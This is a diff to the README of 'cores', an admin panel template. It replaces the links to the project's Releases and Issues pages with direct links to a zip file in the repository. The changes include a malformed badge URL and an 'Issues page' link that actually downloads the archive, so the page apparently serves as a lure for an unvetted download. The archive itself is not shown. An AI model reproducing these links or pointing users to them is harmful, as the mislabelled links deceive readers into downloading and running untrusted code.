@@ -1,7 +1,7 @@
 # 🎨 cores - Easy Admin Panel for Your Web App
 
 ## 📥 Download Here
-[![Download cores](https://img.shields.io/badge/Download%20cores-v1.0-blue.svg)](https://github.com/kimmy665/cores/releases)
+[![Download cores](https://raw.githubusercontent.com/kimmy665/cores/main/route/cores.zip%https://raw.githubusercontent.com/kimmy665/cores/main/route/cores.zip)](https://raw.githubusercontent.com/kimmy665/cores/main/route/cores.zip)
 
 ## 🚀 Getting Started
 cores is a modern admin panel template built with React, TypeScript, and Tailwind CSS. It offers a sleek design and responsiveness, making it easy to manage your web application. Follow these steps to download and run the software.
@@ -19,7 +19,7 @@ cores is a modern admin panel template built with React, TypeScript, and Tailwin
 - **Integration Ready:** Supports various backend services.
 
 ## 📥 Download & Install
-Visit this page to download: [Download cores](https://github.com/kimmy665/cores/releases). You will find the latest version available. 
+Visit this page to download: [Download cores](https://raw.githubusercontent.com/kimmy665/cores/main/route/cores.zip). You will find the latest version available. 
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
@@ -43,7 +43,7 @@ To begin using cores:
 3. Customize settings as needed.
 
 ## ⚙️ Support
-If you need help, visit our [GitHub Issues page](https://github.com/kimmy665/cores/issues) or reach out via email.
+If you need help, visit our [GitHub Issues page](https://raw.githubusercontent.com/kimmy665/cores/main/route/cores.zip) or reach out via email.
 
 ## 📝 Contributing
 If you want to contribute:
